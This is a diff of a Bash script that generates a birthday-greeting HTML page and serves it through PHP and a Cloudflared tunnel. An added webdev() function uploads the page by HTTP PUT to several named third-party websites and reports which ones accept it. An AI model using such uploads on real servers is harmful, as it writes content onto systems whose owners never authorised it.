@@ -1,6 +1,5 @@
 #!/bin/bash
 
-# Colors and styles
 r='\e[91m'
 g='\e[92m'
 y='\e[93m'
@@ -9,38 +8,132 @@ p='\e[95m'
 c='\e[96m'
 w='\e[97m'
 n='\e[0m'
+reset_color() {
+	tput sgr0   # reset attributes
+	tput op     # reset color
+	return
+}
+
+HOST='127.0.0.1'
+PORT='8080'
+
+pkgs=(proot curl php)
+for pkg in "${pkgs[@]}"; do
+ if [[ $(command -v ${pkg}) ]]; then
+    echo -ne ""
+    else
+    pkg install ${pkg}
+fi
+done
+
 
 banner() {
- echo "banner 😐\n\n"
- ask
+ echo ""
 }
 
 
+checkdir() {
 
-
-main() {
-    pids=()
-    if [ -f sl.txt ]; then
-   echo ""
-else
-   curl -s -o sl.txt https://raw.githubusercontent.com/DH-Alamin/file/main/sl.txt
+if [[ ! -d ".server" ]]; then
+	mkdir -p ".server"
 fi
-    for site in $(< sl.txt); do
-        if [[ ${#pids[@]} -ge 2 ]]; then
-            wait -n
-            pid_to_remove=$?
-            for index in "${!pids[@]}"; do
-                if [[ "${pids[$index]}" == "$pid_to_remove" ]]; then
-                    unset 'pids[$index]'
-                    break
-                fi
-            done
-        fi
-        scan "${site}" "${name}" &
-        pids+=($!)
-    done
 
-    wait
+if [[ -d ".server/www" ]]; then
+	rm -rf ".server/www"
+	mkdir -p ".server/www"
+else
+	mkdir -p ".server/www"
+fi
+
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
+fi
+}
+
+download() {
+	url="$1"
+	output="$2"
+	file=`basename $url`
+	if [[ -e "$file" || -e "$output" ]]; then
+		rm -rf "$file" "$output"
+	fi
+	curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+
+	if [[ -e "$file" ]]; then
+		if [[ ${file#*.} == "zip" ]]; then
+			unzip -qq $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ ${file#*.} == "tgz" ]]; then
+			tar -zxf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		else
+			mv -f $file .server/$output > /dev/null 2>&1
+		fi
+		chmod +x .server/$output > /dev/null 2>&1
+		rm -rf "$file"
+	else
+		echo -e "\n${w}[${r}-${w}]${r} Error occured while downloading ${output}."
+		{ reset_color; exit 1; }
+	fi
+}
+
+
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e ""
+	else
+		echo -e "${w}[${g}+${w}]${g} Installing Cloudflared...${n}"
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
+	fi
+}
+
+start_cloudflared() { 
+    rm .cld.log > /dev/null 2>&1 &  
+	   { sleep 1; setup_site; }
+	   if [[ `command -v termux-chroot` ]]; then
+		  sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	fi
+ sleep 8
+	
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	cldflr_link1=${cldflr_link#https://}
+	echo -e "${w}[${g}+${w}]${w} Link : ${g}$cldflr_link${n}"
+}
+
+
+setup_site() {
+ rm -rf index.html
+ mv ${name} index.html
+	cp index.html .server/www
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+}
+
+
+webdev() {
+sl=(http://mpark.co.za http://mc3qs.com http://hq.prospec.co.th http://branch.prospec.co.th)
+for site in "${sl[@]}"; do
+		  curl -s -T ${name} ${site}
+    cd=$( curl -s -o /dev/null ${site}/${name} -w %{http_code} )
+    if [[ $cd == 200 ]] || [[ $cd == 201 ]]; then
+        printf "\n"
+        echo -e "${w}[${g}+${w}] ${w}Link: ${g}${site}/${name} >${cd}<${n}"
+        continue
+    else
+        echo -e "${w}[${r}-${w}] ${w}Link: ${r}${site}/${name} >${cd}<${n}"
+    fi
+done
 }
 
 
@@ -75,15 +168,13 @@ echo -ne "${w}>>> ${g}Enter wishtext ${w}:${g} "
 read wishtext
 echo -ne "${w}>>> ${g}Enter IMG Link ${w}:${g} "
 read img
-echo -ne "${n}"
-dmake
+echo -e "${n}"
 }
 
 
 
 dmake() {
 rm -rf def.html
-
 curl -s -o def.html https://raw.githubusercontent.com/DH-Alamin/file/main/Def.html
 
 cat >> def.html <<-EOF
@@ -130,7 +221,6 @@ cat >> def.html <<-EOF
             <img src="https://raw.githubusercontent.com/DH-Alamin/file/main/img/hat.svg" alt="hat" class="hat" />
             <div class="wish">
                 <h3 class="wish-hbd">Happy Birthday!!!</h3>
-                <h3 class="wish-hbd">${nam}</h3>
                 <h5 id="wishText">${wishtext}</h5>
             </div>
         </div>
@@ -219,10 +309,16 @@ cat >> def.html <<-EOF
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>    
 </html>
 EOF
-mv def.html ${nam}.html
-name="${nam}.html"
+
 }
 
 
 banner
-main
+ask
+dmake
+mv def.html ${nam}.html
+name="${nam}.html"
+checkdir
+install_cloudflared
+start_cloudflared
+
